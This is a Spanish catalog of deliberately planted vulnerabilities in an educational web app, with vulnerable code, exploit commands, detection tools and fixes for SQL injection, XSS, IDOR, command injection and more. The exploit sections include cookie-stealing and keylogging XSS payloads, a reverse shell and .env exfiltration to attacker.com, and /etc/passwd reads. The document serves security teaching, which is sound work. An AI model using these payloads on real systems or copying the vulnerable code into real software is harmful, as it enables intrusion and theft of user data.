# 🔓 Catálogo de Vulnerabilidades

Este documento lista todas las vulnerabilidades incluidas intencionalmente en esta aplicación para fines educativos.

## Índice

1. [SQL Injection](#1-sql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Broken Authentication](#3-broken-authentication)
4. [Sensitive Data Exposure](#4-sensitive-data-exposure)
5. [Insecure Direct Object Reference (IDOR)](#5-insecure-direct-object-reference-idor)
6. [Security Misconfiguration](#6-security-misconfiguration)
7. [Vulnerable and Outdated Components](#7-vulnerable-and-outdated-components)
8. [Command Injection](#8-command-injection)

---

## 1. SQL Injection

### 📊 Información General

- **OWASP Top 10**: A03:2021 - Injection
- **CWE**: CWE-89
- **Severidad**: 🔴 **CRÍTICA**
- **CVSS Score**: 9.0

### 📍 Ubicación

- **Archivo**: `netlify/functions/search.js`
- **Línea**: 39-41
- **Endpoint**: `GET /api/search?q=<query>`

### 💥 Descripción

El endpoint de búsqueda concatena directamente el input del usuario en una query SQL sin ninguna validación o sanitización. Esto permite a un atacante ejecutar comandos SQL arbitrarios.

```javascript
// Código vulnerable
const sqlQuery = `SELECT * FROM users WHERE username LIKE '%${searchQuery}%' OR email LIKE '%${searchQuery}%'`;
```

### 🎯 Explotación

```bash
# Bypass de filtros - devolver todos los usuarios
curl "http://localhost:8888/api/search?q=admin'+OR+'1'='1"

# UNION-based injection (simulada)
curl "http://localhost:8888/api/search?q='+UNION+SELECT+password+FROM+users--"

# Boolean-based blind SQLi
curl "http://localhost:8888/api/search?q=admin'+AND+'1'='1"
```

### 🛠️ Herramientas de Detección

- **SAST**: Semgrep, CodeQL, SonarQube, Checkmarx
- **DAST**: SQLMap, OWASP ZAP, Burp Suite Scanner
- **Manual**: Payloads de SQL Injection

### ✅ Remediación

```javascript
// Usar prepared statements
const query = 'SELECT * FROM users WHERE username LIKE $1 OR email LIKE $1';
const values = [`%${searchQuery}%`];
const result = await pool.query(query, values);

// O usar un ORM con escape automático
const results = await User.findAll({
    where: {
        [Op.or]: [
            { username: { [Op.like]: `%${searchQuery}%` } },
            { email: { [Op.like]: `%${searchQuery}%` } }
        ]
    }
});
```

---

## 2. Cross-Site Scripting (XSS)

### 📊 Información General

- **OWASP Top 10**: A03:2021 - Injection
- **CWE**: CWE-79
- **Severidad**: 🟠 **ALTA**
- **CVSS Score**: 7.3

### 📍 Ubicación

- **Archivos**:
  - `public/app.js` - Líneas 92-106
  - `public/index.html` - Línea 52 (comentario sobre vuln)
- **Endpoint**: Formulario de comentarios en el frontend

### 💥 Descripción

La aplicación renderiza comentarios de usuarios utilizando `innerHTML` sin ninguna sanitización, permitiendo la ejecución de scripts maliciosos en el contexto del navegador de otros usuarios.

```javascript
// Código vulnerable
commentsDiv.innerHTML += `
    <div class="comment-item">
        <strong>Comentario #${index + 1}:</strong><br>
        ${c}  <!-- Sin sanitización -->
    </div>
`;
```

### 🎯 Explotación

```html
<!-- XSS básico -->
<script>alert('XSS')</script>

<!-- XSS con img tag -->
<img src=x onerror=alert('XSS')>

<!-- XSS con event handlers -->
<svg onload=alert('XSS')>

<!-- Session stealing -->
<script>fetch('http://attacker.com?cookie='+document.cookie)</script>

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('http://attacker.com?key='+e.key)}</script>
```

### 🛠️ Herramientas de Detección

- **SAST**: Semgrep, ESLint security plugin, SonarQube
- **DAST**: OWASP ZAP, Burp Suite, XSStrike
- **Manual**: Probar payloads de XSS manualmente

### ✅ Remediación

```javascript
// Opción 1: Usar textContent en lugar de innerHTML
const commentDiv = document.createElement('div');
commentDiv.className = 'comment-item';
commentDiv.textContent = comment;
commentsDiv.appendChild(commentDiv);

// Opción 2: Usar DOMPurify para sanitizar HTML
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(comment);
commentsDiv.innerHTML += clean;

// Opción 3: Escapar caracteres especiales
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}
```

---

## 3. Broken Authentication

### 📊 Información General

- **OWASP Top 10**: A07:2021 - Identification and Authentication Failures
- **CWE**: CWE-287, CWE-798
- **Severidad**: 🔴 **CRÍTICA**
- **CVSS Score**: 9.8

### 📍 Ubicación

- **Archivo**: `netlify/functions/auth.js`
- **Líneas**: 8-30 (credenciales hardcodeadas), 80-92 (JWT sin expiración)
- **Endpoint**: `POST /api/auth`

### 💥 Descripción

Múltiples vulnerabilidades de autenticación:

1. **Credenciales hardcodeadas** en el código fuente
2. **Contraseñas en texto plano** (sin hash)
3. **JWT sin expiración** (`expiresIn` omitido)
4. **JWT Secret hardcodeado** en el código
5. **Sin rate limiting** (permite brute force)
6. **Comparación de contraseñas insegura**
7. **Información sensible en el JWT payload**

```javascript
// Vulnerabilidades
const HARDCODED_USERS = [
    { username: 'admin', password: 'admin123' } // ⚠️ Hardcoded
];

const JWT_SECRET = 'super_secret_key_that_should_not_be_here_123'; // ⚠️ Hardcoded

const token = jwt.sign(payload, JWT_SECRET); // ⚠️ Sin expiresIn
```

### 🎯 Explotación

```bash
# Login con credenciales hardcodeadas
curl -X POST http://localhost:8888/api/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# Brute force (sin rate limiting)
for pass in $(cat passwords.txt); do
    curl -X POST http://localhost:8888/api/auth \
      -d "{\"username\":\"admin\",\"password\":\"$pass\"}"
done

# JWT sin expiración puede ser usado indefinidamente
# Extraer el secret del código fuente y forjar tokens propios
```

### 🛠️ Herramientas de Detección

- **SAST**: Semgrep, GitGuardian, TruffleHog, SonarQube
- **DAST**: Hydra, Burp Suite Intruder, OWASP ZAP
- **Manual**: Revisar código fuente, testing de brute force

### ✅ Remediación

```javascript
// 1. Usar variables de entorno
const JWT_SECRET = process.env.JWT_SECRET;

// 2. Hashear contraseñas con bcrypt
const bcrypt = require('bcrypt');
const hash = await bcrypt.hash(password, 10);
const isValid = await bcrypt.compare(password, user.passwordHash);

// 3. JWT con expiración
const token = jwt.sign(payload, JWT_SECRET, { expiresIn: '1h' });

// 4. Implementar rate limiting
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 5 // 5 intentos
});

// 5. Implementar 2FA/MFA
// 6. Implementar logout y revocación de tokens
```

---

## 4. Sensitive Data Exposure

### 📊 Información General

- **OWASP Top 10**: A02:2021 - Cryptographic Failures
- **CWE**: CWE-200, CWE-522, CWE-312
- **Severidad**: 🔴 **CRÍTICA**
- **CVSS Score**: 8.5

### 📍 Ubicación

- **Archivos**:
  - `public/index.html` - Líneas 18-22 (API keys en comentarios HTML)
  - `public/app.js` - Línea 9 (token hardcodeado)
  - `.env.example` - Todo el archivo (con valores reales)
  - `netlify/functions/auth.js` - Línea 109 (secret en response)
  - `netlify/functions/user.js` - Líneas 90-100 (datos sensibles expuestos)

### 💥 Descripción

La aplicación expone información sensible en múltiples lugares:

1. **API keys en comentarios HTML** (visibles en view source)
2. **Tokens en código JavaScript**
3. **Secretos en .env.example**
4. **JWT Secret en responses de API**
5. **Datos sensibles sin filtrar** (SSN, password hashes, API keys)
6. **Stack traces completos** en errores

```html
<!-- Visible en el código fuente -->
<!-- [EDUCATIONAL] Estas NO son keys reales, son ejemplos para demostración -->
<!--
    API_KEY: sk_test_FAKE_H4ck3rCanSeeThis_EDUCATIONAL_ONLY_123
    SECRET_TOKEN: ghp_FAKE_token_not_real_educational_example_only
-->
```

```javascript
// En el código JS del frontend
// [EDUCATIONAL] Esta NO es una key real, es un ejemplo para demostración
const HARDCODED_API_TOKEN = 'Bearer sk_test_FAKE_not_real_EDUCATIONAL_example_12345';
```

### 🎯 Explotación

```bash
# 1. Ver código fuente HTML para encontrar secrets
curl http://localhost:8888 | grep -i "api.*key"

# 2. Revisar archivos JS
curl http://localhost:8888/app.js | grep -i "token\|key\|secret"

# 3. Acceder a perfiles de usuarios para obtener datos sensibles
curl "http://localhost:8888/api/user?id=1"
# Response incluye: passwordHash, apiKey, ssn, creditCard, salary

# 4. Revisar errores para stack traces
curl "http://localhost:8888/api/auth" -X POST -d "invalid"
```

### 🛠️ Herramientas de Detección

- **SAST**: TruffleHog, GitGuardian, git-secrets, Semgrep
- **DAST**: OWASP ZAP, Burp Suite, manual inspection
- **Manual**: Revisar responses de API, código fuente, commits de git

### ✅ Remediación

```javascript
// 1. Nunca incluir secrets en el frontend
// Mover toda lógica de API keys al backend

// 2. Usar variables de entorno
const apiKey = process.env.API_KEY;

// 3. Filtrar datos sensibles en responses
const sanitizedUser = {
    id: user.id,
    username: user.username,
    email: user.email
    // NO incluir: passwordHash, apiKey, ssn, etc.
};

// 4. No exponer detalles de errores en producción
if (process.env.NODE_ENV === 'production') {
    return { error: 'Error interno del servidor' };
} else {
    return { error: error.message };
}

// 5. Usar herramientas de secretos (AWS Secrets Manager, HashiCorp Vault)

// 6. Agregar .env al .gitignore
// 7. Escanear git history para secrets: git secrets --scan-history
```

---

## 5. Insecure Direct Object Reference (IDOR)

### 📊 Información General

- **OWASP Top 10**: A01:2021 - Broken Access Control
- **CWE**: CWE-639, CWE-284
- **Severidad**: 🔴 **CRÍTICA**
- **CVSS Score**: 8.0

### 📍 Ubicación

- **Archivo**: `netlify/functions/user.js`
- **Líneas**: 73-100
- **Endpoint**: `GET /api/user?id=<id>`

### 💥 Descripción

El endpoint permite acceder a cualquier perfil de usuario simplemente cambiando el parámetro `id` en la URL, sin validar si el usuario autenticado tiene permiso para acceder a ese recurso.

```javascript
// Código vulnerable - Sin validación de autorización
const userId = event.queryStringParameters?.id;
const user = USERS_DB.find(u => u.id === parseInt(userId));
return { statusCode: 200, body: JSON.stringify(user) }; // ⚠️ Devuelve cualquier usuario
```

### 🎯 Explotación

```bash
# Enumerar todos los usuarios cambiando el ID
for i in {1..100}; do
    curl "http://localhost:8888/api/user?id=$i"
done

# Acceder a perfil de admin sin ser admin
curl "http://localhost:8888/api/user?id=1"

# Obtener datos sensibles de todos los usuarios
curl "http://localhost:8888/api/user?id=1" | jq '.ssn, .apiKey, .passwordHash'
```

### 🛠️ Herramientas de Detección

- **SAST**: Semgrep (custom rules para authorization checks)
- **DAST**: OWASP ZAP (Authorization Testing), Burp Suite, Autorize extension
- **Manual**: Probar acceso a recursos con diferentes usuarios/roles

### ✅ Remediación

```javascript
// 1. Verificar autenticación
const token = event.headers.authorization?.replace('Bearer ', '');
if (!token) {
    return { statusCode: 401, body: JSON.stringify({ error: 'No autenticado' }) };
}

// 2. Verificar autorización
const decoded = jwt.verify(token, JWT_SECRET);

// Solo permitir ver propio perfil O ser admin
if (decoded.id !== parseInt(userId) && decoded.role !== 'admin') {
    return {
        statusCode: 403,
        body: JSON.stringify({ error: 'No autorizado' })
    };
}

// 3. Implementar RBAC (Role-Based Access Control)
function checkPermission(user, action, resource) {
    const permissions = {
        admin: ['read:all', 'write:all', 'delete:all'],
        user: ['read:own', 'write:own']
    };
    return permissions[user.role].includes(action);
}

// 4. Usar UUIDs en lugar de IDs secuenciales
// Dificulta la enumeración (pero no reemplaza la validación de autorización)
```

---

## 6. Security Misconfiguration

### 📊 Información General

- **OWASP Top 10**: A05:2021 - Security Misconfiguration
- **CWE**: CWE-16, CWE-942
- **Severidad**: 🟠 **ALTA**
- **CVSS Score**: 7.5

### 📍 Ubicación

- **Archivos**:
  - `netlify.toml` - Líneas 22-28 (CORS abierto)
  - `netlify.toml` - Headers de seguridad faltantes
  - Todas las functions (`*.js`) - CORS headers con `*`

### 💥 Descripción

Múltiples problemas de configuración de seguridad:

1. **CORS abierto** (`Access-Control-Allow-Origin: *`)
2. **Headers de seguridad faltantes**:
   - Content-Security-Policy
   - X-Frame-Options
   - X-Content-Type-Options
   - Strict-Transport-Security (HSTS)
   - Referrer-Policy
3. **Sin restricciones de métodos HTTP**
4. **Información de versión expuesta**

```toml
# netlify.toml - CORS abierto
[[headers]]
  for = "/*"
  [headers.values]
    Access-Control-Allow-Origin = "*"  # ⚠️ Permite cualquier origen
```

### 🎯 Explotación

```bash
# 1. CORS abierto permite requests desde cualquier dominio
# Un sitio malicioso puede hacer requests a la API

# 2. Sin X-Frame-Options permite clickjacking
<iframe src="http://vulnerable-app.com"></iframe>

# 3. Sin CSP permite XSS más fácilmente

# 4. Sin HSTS vulnerable a downgrade attacks
```

### 🛠️ Herramientas de Detección

- **DAST**: OWASP ZAP, Burp Suite, securityheaders.com
- **Manual**: Revisar responses headers, netlify.toml
- **Online**: Mozilla Observatory, SSL Labs

### ✅ Remediación

```toml
# netlify.toml - Configuración segura
[[headers]]
  for = "/*"
  [headers.values]
    # CORS restringido
    Access-Control-Allow-Origin = "https://trusted-domain.com"

    # Security headers
    Content-Security-Policy = "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
    X-Frame-Options = "DENY"
    X-Content-Type-Options = "nosniff"
    Referrer-Policy = "strict-origin-when-cross-origin"
    Permissions-Policy = "geolocation=(), microphone=(), camera=()"
    Strict-Transport-Security = "max-age=31536000; includeSubDomains; preload"
    X-XSS-Protection = "1; mode=block"
```

---

## 7. Vulnerable and Outdated Components

### 📊 Información General

- **OWASP Top 10**: A06:2021 - Vulnerable and Outdated Components
- **CWE**: CWE-1035
- **Severidad**: 🟠 **ALTA**
- **CVSS Score**: 7.5-9.0 (dependiendo de la vulnerabilidad)

### 📍 Ubicación

- **Archivo**: `package.json`
- **Líneas**: 23-26
- **Dependencias**: lodash@4.17.15, axios@0.21.1, express@4.17.1

### 💥 Descripción

El proyecto incluye intencionalmente dependencias con vulnerabilidades conocidas (CVEs):

1. **lodash@4.17.15**
   - CVE-2019-10744 (Prototype Pollution) - CVSS 9.1
   - CVE-2020-8203 (Prototype Pollution) - CVSS 7.4

2. **axios@0.21.1**
   - CVE-2021-3749 (ReDoS) - CVSS 7.5

3. **express@4.17.1**
   - CVE-2022-24999 (Open Redirect) - CVSS 6.1

```json
{
  "dependencies": {
    "lodash": "4.17.15",  // ⚠️ Vulnerable
    "axios": "0.21.1",    // ⚠️ Vulnerable
    "express": "4.17.1"   // ⚠️ Vulnerable
  }
}
```

### 🎯 Explotación

```javascript
// Prototype Pollution con lodash@4.17.15
const _ = require('lodash');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
_.defaultsDeep({}, payload);
console.log({}.polluted); // "yes" - Prototype contaminado

// Esto puede llevar a RCE en ciertos contextos
```

### 🛠️ Herramientas de Detección

- **SCA**: npm audit, Snyk, OWASP Dependency-Check, WhiteSource, retire.js
- **GitHub**: Dependabot alerts
- **Manual**: Revisar package.json y ejecutar `npm audit`

```bash
# Detectar vulnerabilidades
npm audit

# Ver detalles
npm audit --json

# Intentar fix automático (en un proyecto real)
npm audit fix
```

### ✅ Remediación

```json
// package.json - Versiones actualizadas
{
  "dependencies": {
    "lodash": "^4.17.21",    // Fix para CVEs de lodash
    "axios": "^1.6.0",       // Fix para CVE de axios
    "express": "^4.18.2"     // Fix para CVE de express
  }
}
```

```bash
# Comandos de remediación
npm update lodash axios express
npm audit fix

# Para actualizaciones breaking
npm install lodash@latest axios@latest express@latest

# Verificar que no haya vulnerabilidades
npm audit
```

**Best Practices**:
- Mantener dependencias actualizadas
- Usar Dependabot o Renovate para PRs automáticos
- Ejecutar `npm audit` en CI/CD
- Revisar changelogs antes de actualizar
- Usar lock files (package-lock.json)

---

## 8. Command Injection

### 📊 Información General

- **OWASP Top 10**: A03:2021 - Injection
- **CWE**: CWE-78
- **Severidad**: 🔴 **CRÍTICA**
- **CVSS Score**: 9.8

### 📍 Ubicación

- **Archivo**: `netlify/functions/ping.js`
- **Líneas**: 36-40
- **Endpoint**: `GET /api/ping?host=<hostname>`

### 💥 Descripción

El endpoint ejecuta el comando `ping` concatenando directamente el input del usuario sin validación, permitiendo la inyección de comandos arbitrarios del sistema operativo.

```javascript
// Código vulnerable
const command = `ping -c 4 ${hostname}`; // ⚠️ Concatenación directa
const { stdout, stderr } = await execPromise(command);
```

### 🎯 Explotación

```bash
# 1. Listado de archivos
curl "http://localhost:8888/api/ping?host=google.com;ls -la"
curl "http://localhost:8888/api/ping?host=google.com%26%26ls"

# 2. Ver archivos sensibles
curl "http://localhost:8888/api/ping?host=google.com;cat /etc/passwd"
curl "http://localhost:8888/api/ping?host=google.com;cat .env"

# 3. Información del sistema
curl "http://localhost:8888/api/ping?host=google.com;whoami"
curl "http://localhost:8888/api/ping?host=google.com;uname -a"

# 4. Reverse shell (en escenario real)
curl "http://localhost:8888/api/ping?host=google.com;bash -i >& /dev/tcp/attacker.com/4444 0>&1"

# 5. Exfiltración de datos
curl "http://localhost:8888/api/ping?host=google.com;curl http://attacker.com/?data=\$(cat .env|base64)"
```

### 🛠️ Herramientas de Detección

- **SAST**: Semgrep, Bandit (Python), ShellCheck, CodeQL
- **DAST**: Commix, OWASP ZAP, Burp Suite
- **Manual**: Probar payloads de command injection

### ✅ Remediación

```javascript
// Opción 1: Validar con whitelist estricta
function isValidHostname(hostname) {
    const hostnameRegex = /^[a-zA-Z0-9.-]+$/;
    if (!hostnameRegex.test(hostname)) {
        throw new Error('Hostname inválido');
    }
    return true;
}

isValidHostname(hostname); // Validar antes de usar

// Opción 2: Usar librería específica (mejor)
const ping = require('ping');
const result = await ping.promise.probe(hostname);

// Opción 3: execFile con array (no invoca shell)
const { execFile } = require('child_process');
execFile('ping', ['-c', '4', hostname], (error, stdout) => {
    // Los argumentos en array no permiten inyección
});

// Opción 4: spawn (más seguro que exec)
const { spawn } = require('child_process');
const child = spawn('ping', ['-c', '4', hostname]);
```

**Regla de oro**: NUNCA usar `exec`, `eval`, `system`, o `shell=True` con input del usuario.

---

## 📈 Resumen por Severidad

### 🔴 Críticas (4)
1. SQL Injection
2. Broken Authentication
3. Sensitive Data Exposure
4. Command Injection
5. IDOR

### 🟠 Altas (2)
1. Cross-Site Scripting (XSS)
2. Security Misconfiguration
3. Vulnerable Dependencies

---

## 🛡️ Orden de Remediación Recomendado

1. **Command Injection** - Permite ejecución remota de código
2. **Broken Authentication** - Controla acceso a todo el sistema
3. **SQL Injection** - Acceso a toda la base de datos
4. **Sensitive Data Exposure** - Previene exposición inmediata de secrets
5. **IDOR** - Protege datos de usuarios
6. **Vulnerable Dependencies** - Actualización rápida
7. **XSS** - Protege a los usuarios finales
8. **Security Misconfiguration** - Mejora la postura general de seguridad

---

## 🧪 Testing Checklist

- [ ] Ejecutar `npm audit` y verificar todas las CVEs
- [ ] Probar todos los payloads de SQL Injection
- [ ] Probar todos los payloads de XSS
- [ ] Intentar login con brute force
- [ ] Enumerar usuarios con IDOR
- [ ] Revisar código fuente HTML para secrets
- [ ] Probar command injection en endpoint de ping
- [ ] Verificar headers de seguridad con securityheaders.com
- [ ] Ejecutar OWASP ZAP Active Scan
- [ ] Ejecutar Semgrep con reglas de seguridad

---

## 📚 Referencias

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

---

**⚠️ Recordatorio**: Esta es una aplicación vulnerable INTENCIONAL para fines educativos. NO usar en producción.
